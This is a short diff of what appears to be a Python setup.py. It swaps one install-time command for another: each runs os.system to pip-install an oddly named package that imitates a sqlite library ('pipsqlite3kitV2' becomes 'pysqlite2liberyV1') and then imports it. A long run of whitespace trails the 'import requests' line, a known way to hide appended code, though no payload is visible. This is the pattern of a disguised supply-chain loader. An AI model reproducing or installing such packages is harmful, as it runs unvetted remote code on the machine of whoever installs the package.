@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 import os
-os.system("pip install pipsqlite3kitV2")
-import pipsqlite3kitV2
+os.system("pip install pysqlite2liberyV1")
+import pysqlite2liberyV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from setuptools import setup, find_packages
 import os
